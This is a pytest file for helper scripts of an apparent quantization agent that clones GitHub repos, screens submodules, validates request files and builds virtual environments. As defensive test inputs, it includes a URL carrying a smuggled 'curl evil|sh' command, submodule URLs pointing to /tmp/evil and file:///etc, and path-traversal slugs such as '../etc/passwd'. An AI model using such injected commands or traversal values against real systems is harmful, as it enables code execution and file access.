"""Offline tests for gather skill helper scripts."""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / "agents" / "skills" / "_shared" / "scripts"


def _run(script: str, args: list[str], *, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, "-B", str(SCRIPTS / script), *args],
        capture_output=True,
        text=True,
        env=env or os.environ.copy(),
    )


def test_clone_rejects_non_github_url():
    result = _run("clone.py", ["--slug", "awq", "--repo-url", "https://evil.com/a/b"])
    assert result.returncode != 0
    payload = json.loads(result.stdout)
    assert payload["status"] == "error"
    assert "not a plain GitHub repo URL" in payload["error"]


def test_clone_rejects_gitlab_and_shell_metacharacters():
    for url in (
        "https://gitlab.com/owner/repo",
        "https://github.com/x/y; curl evil|sh",
        "git@github.com:owner/repo.git",
    ):
        result = _run("clone.py", ["--slug", "awq", "--repo-url", url])
        assert result.returncode != 0, url
        payload = json.loads(result.stdout)
        assert payload["status"] == "error"
        assert "not a plain GitHub repo URL" in payload["error"]


def _clone_mod():
    sys.path.insert(0, str(SCRIPTS))
    import clone as clone_mod  # noqa: E402

    return clone_mod


def test_clone_parses_gitmodules_and_screens_urls():
    clone_mod = _clone_mod()
    modules = clone_mod.parse_gitmodules(
        '[submodule "third-party/cutlass"]\n\tpath = third-party/cutlass\n'
        "\turl = https://github.com/NVIDIA/cutlass.git\n"
        '[submodule "rel"]\n\tpath = kernels\n\turl = ../kernels.git\n'
        '[submodule "ssh"]\n\tpath = ssh\n\turl = git@github.com:a/b.git\n'
        '[submodule "local"]\n\tpath = local\n\turl = /tmp/evil\n'
        '[submodule "escape"]\n\tpath = ../out\n\turl = https://github.com/a/b\n'
        '[submodule "nourl"]\n\tpath = x\n'
    )
    assert [m["name"] for m in modules] == ["third-party/cutlass", "rel", "ssh", "local", "escape"]
    reasons = {m["name"]: clone_mod.submodule_skip_reason(m) for m in modules}
    assert reasons["third-party/cutlass"] is None and reasons["rel"] is None
    assert "not GitHub" in reasons["ssh"] and "not GitHub" in reasons["local"]
    assert reasons["escape"] == "path escapes the checkout"


def test_clone_skips_disallowed_submodules_without_running_git(tmp_path):
    clone_mod = _clone_mod()
    assert clone_mod.init_submodules(tmp_path) == {"submodules": [], "submodules_skipped": []}
    (tmp_path / ".gitmodules").write_text('[submodule "x"]\n\tpath = x\n\turl = file:///etc\n')
    result = clone_mod.init_submodules(tmp_path)
    assert result["submodules"] == []
    assert result["submodules_skipped"][0]["path"] == "x"


def test_request_json_missing_fields(tmp_path):
    sys.path.insert(0, str(SCRIPTS))
    import request as request_mod  # noqa: E402

    path = tmp_path / "incomplete.json"
    path.write_text(json.dumps({"method_name": "AWQ", "model_id": "org/model"}) + "\n")
    with pytest.raises(ValueError, match="missing"):
        request_mod.load_request(path)

    result = _run("request.py", [str(path)])
    assert result.returncode != 0
    combined = result.stderr + result.stdout
    assert "missing" in combined


def test_refuse_qat_training_only(tmp_path):
    paper = tmp_path / "qat.txt"
    paper.write_text(
        "LLM-QAT is a quantization-aware training method. The network is trained from "
        "scratch with QAT; it is not a post-training quantization method and cannot "
        "quantize an existing checkpoint.\n"
    )
    result = _run("refuse.py", [str(paper)])
    assert result.returncode == 2
    payload = json.loads(result.stdout)
    assert payload["status"] == "refused"
    assert payload["reason"] == "qat_training_only"


def test_refuse_kv_cache_only(tmp_path):
    paper = tmp_path / "kivi.txt"
    paper.write_text(
        "KIVI performs runtime KV-cache quantization. It does not reduce model weight "
        "memory and does not save quantized weights. This is orthogonal to weight "
        "quantization.\n"
    )
    result = _run("refuse.py", [str(paper)])
    assert result.returncode == 2
    payload = json.loads(result.stdout)
    assert payload["status"] == "refused"
    assert payload["reason"] == "kv_cache_only"


def test_refuse_bitnet_1_58_llama_quant(tmp_path):
    paper = tmp_path / "bitnet.txt"
    paper.write_text(
        "BitNet b1.58 trains 1.58-bit ternary weights for Llama from scratch. "
        "It is not a way to quantize an existing Llama checkpoint.\n"
    )
    result = _run("refuse.py", [str(paper)])
    assert result.returncode == 2
    payload = json.loads(result.stdout)
    assert payload["status"] == "refused"
    assert payload["reason"] == "bitnet_1_58"


def test_refuse_allows_ptq_weight_paper(tmp_path):
    paper = tmp_path / "awq.txt"
    paper.write_text(
        "AWQ is a post-training weight quantization method for LLMs. "
        "Activation-aware scaling protects salient channels. No training is required.\n"
    )
    result = _run("refuse.py", [str(paper)])
    assert result.returncode == 0
    payload = json.loads(result.stdout)
    assert payload["status"] == "ok"


def test_request_write_rejects_unsafe_slug_and_secret_keys(tmp_path, monkeypatch):
    sys.path.insert(0, str(SCRIPTS))
    import request as request_mod  # noqa: E402
    import paths as paths_mod  # noqa: E402

    monkeypatch.setattr(request_mod, "REQUESTS_ROOT", tmp_path)
    monkeypatch.setattr(paths_mod, "REQUESTS_ROOT", tmp_path)
    with pytest.raises(ValueError, match="invalid slug"):
        request_mod.write_request({"slug": "../etc/passwd", "method_name": "AWQ"})
    with pytest.raises(ValueError, match="secret-like"):
        request_mod.write_request({"slug": "awq-qwen", "HF_TOKEN": "hf_xxx"})
        with pytest.raises(ValueError, match="unsupported keys"):
            request_mod.write_request({"slug": "awq-qwen", "notes": "nope"})


def test_torch_spec_matches_nvcc_toolkit_not_driver(monkeypatch):
    sys.path.insert(0, str(SCRIPTS))
    import torch_spec as spec_mod  # noqa: E402

    monkeypatch.delenv("QUANT_AGENT_TORCH_SPEC", raising=False)
    monkeypatch.setattr(spec_mod, "_nvcc_release", lambda: (12, 8))
    monkeypatch.setattr(spec_mod, "_compute_capability", lambda: 8.6)
    spec = spec_mod.detect_torch_spec()
    assert spec.cuda_tag == "cu128"
    assert spec.torch_pin == "torch==2.7.1"

    for toolkit in ((13, 0), (13, 3), (14, 1)):
        monkeypatch.setattr(spec_mod, "_nvcc_release", lambda t=toolkit: t)
        assert spec_mod.detect_torch_spec() == spec_mod.TorchSpec(torch_pin="torch==2.9.1", cuda_tag="cu130")

    monkeypatch.setattr(spec_mod, "_nvcc_release", lambda: None)
    monkeypatch.setattr(spec_mod, "_compute_capability", lambda: 8.6)
    spec = spec_mod.detect_torch_spec()
    assert spec.cuda_tag == "cu121"
    assert spec.torch_pin == "torch==2.3.1"

    monkeypatch.setenv("QUANT_AGENT_TORCH_SPEC", "torch==2.4.1|cu124")
    spec = spec_mod.detect_torch_spec()
    assert spec == spec_mod.TorchSpec(torch_pin="torch==2.4.1", cuda_tag="cu124")


def test_install_venv_bootstraps_setuptools(monkeypatch):
    sys.path.insert(0, str(SCRIPTS))
    import install_venv as install_mod  # noqa: E402

    bootstrap = install_mod._baseline_packages(Path("/tmp/fake-venv/bin/python"))[0]
    assert {"pip", "setuptools", "wheel"} <= set(bootstrap)


def test_install_venv_treats_requirements_vs_local_install():
    sys.path.insert(0, str(SCRIPTS))
    import install_venv as install_mod  # noqa: E402

    py = Path("/tmp/fake-venv/bin/python")
    reqs, _ = install_mod._parse_install_step("pip install -r requirements.txt", py)
    assert install_mod._is_requirements_install(reqs)
    assert not install_mod._is_local_project_install(reqs)
    editable, _ = install_mod._parse_install_step("pip install -e .", py)
    assert install_mod._is_local_project_install(editable)
    assert not install_mod._is_requirements_install(editable)


def test_install_venv_adds_no_build_isolation_for_local_editable():
    sys.path.insert(0, str(SCRIPTS))
    import install_venv as install_mod  # noqa: E402

    py = Path("/tmp/fake-venv/bin/python")
    argv, extra = install_mod._parse_install_step("pip install -e .", py)
    assert extra == {}
    assert argv[:4] == [str(py), "-m", "pip", "install"]
    assert "--no-build-isolation" in argv
    assert argv[argv.index("install") + 1] == "--no-build-isolation"
    assert "-e" in argv and "." in argv

    already, _ = install_mod._parse_install_step(
        "pip install --no-build-isolation -e .", py
    )
    assert already.count("--no-build-isolation") == 1

    reqs, _ = install_mod._parse_install_step("pip install -r requirements.txt", py)
    assert "--no-build-isolation" not in reqs

    pypi, _ = install_mod._parse_install_step("pip install flash-attn", py)
    assert "--no-build-isolation" not in pypi

    explicit, _ = install_mod._parse_install_step(
        "pip install flash-attn --no-build-isolation", py
    )
    assert "--no-build-isolation" in explicit


def test_require_slug_blocks_venv_escape():
    sys.path.insert(0, str(SCRIPTS))
    import paths as paths_mod  # noqa: E402

    with pytest.raises(ValueError, match="invalid slug"):
        paths_mod.venv_python("/tmp/pwn")
    with pytest.raises(ValueError, match="invalid slug"):
        paths_mod.venv_python("../etc")


def test_venv_python_allows_interpreter_symlink_outside_venvs(tmp_path, monkeypatch):
    sys.path.insert(0, str(SCRIPTS))
    import paths as paths_mod  # noqa: E402

    venv_root = tmp_path / "venvs"
    slug_dir = venv_root / "flatquant-phi3-mini-4k-g52xlarge"
    (slug_dir / "bin").mkdir(parents=True)
    interpreter = tmp_path / "system-python"
    interpreter.write_text("#!/bin/sh\n")
    (slug_dir / "bin" / "python").symlink_to(interpreter)
    monkeypatch.setattr(paths_mod, "VENV_ROOT", venv_root)

    py = paths_mod.venv_python("flatquant-phi3-mini-4k-g52xlarge")
    assert py.parent.parent == slug_dir.resolve()
    assert py.name == "python"
    assert py.is_symlink()
    assert py.resolve() == interpreter.resolve()


def test_request_record_retry_updates_budget(tmp_path, monkeypatch):
    sys.path.insert(0, str(SCRIPTS))
    import request as request_mod  # noqa: E402

    monkeypatch.setattr(request_mod, "REQUESTS_ROOT", tmp_path)
    payload = {
        "method_name": "FlatQuant",
        "model_id": "org/model",
        "gpu_instance": "g5.xlarge",
        "arxiv_id": "0000.00000",
        "paper_path": "paper.txt",
        "repo_url": "https://github.com/o/r",
        "repo_path": "repo",
        "repo_commit": "a" * 40,
        "hf_snapshot_path": "snap",
        "slug": "flatquant-org-model-g5xlarge",
        "ranked": ["out/overlays/x/adapter_only/aaa/"],
    }
    path = request_mod.write_request(payload)
    seeded = json.loads(path.read_text())
    assert seeded["retry_gpu_jobs_used"] == 0
    assert seeded["retry_gpu_jobs_max"] == 14
    assert seeded["tried_overlays"] == []
    updated = request_mod.record_retry(
        path,
        tried_overlay="out/overlays/x/dispatch/bbb",
        last_job_id="20260919T000000Z-abc123",
        last_diagnose_path="jobs/20260919T000000Z-abc123/diagnose.json",
    )
    assert updated["retry_gpu_jobs_used"] == 1
    assert updated["retry_gpu_jobs_max"] == 14
    assert "out/overlays/x/dispatch/bbb" in updated["tried_overlays"]
    assert updated["last_job_id"] == "20260919T000000Z-abc123"

